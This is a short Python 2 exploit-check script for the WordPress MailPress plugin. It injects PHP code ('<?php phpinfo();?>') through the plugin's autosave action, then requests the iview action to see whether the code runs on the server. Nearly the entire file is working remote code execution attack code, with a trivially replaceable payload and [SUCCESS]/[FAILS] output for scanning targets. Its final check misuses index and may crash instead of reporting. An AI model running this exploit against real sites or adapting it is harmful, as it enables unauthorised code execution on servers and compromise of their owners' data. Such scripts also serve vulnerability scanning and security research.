#coding:utf-8


import urllib2
import sys
import re

def audit(host):
    target = host+"/wp-content/plugins/mailpress/mp-includes/action.php"
    post_data = "action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php phpinfo();?>"\
        + "&html=&plaintext=&mail_format=standard&autosave=1"
    content = urllib2.urlopen(url=target, data=post_data).read()
    # print content
    regex = r"(autosave id=['\"])(\d+)(['\"])"
    m = re.search(regex, content)    
    if not m:
        print u'[FAILS]'
        return
    id = m.group(2)
    # print id
    target1 = host + "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=%s" % id
    content1 = urllib2.urlopen(url=target1).read()
    if content1.lower().index('php') != -1:
        print u'[SUCCESS]'
    else:
        print u'[FAILS]'
    

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print u'[PARAM]'
    else:
        audit(sys.argv[1])
    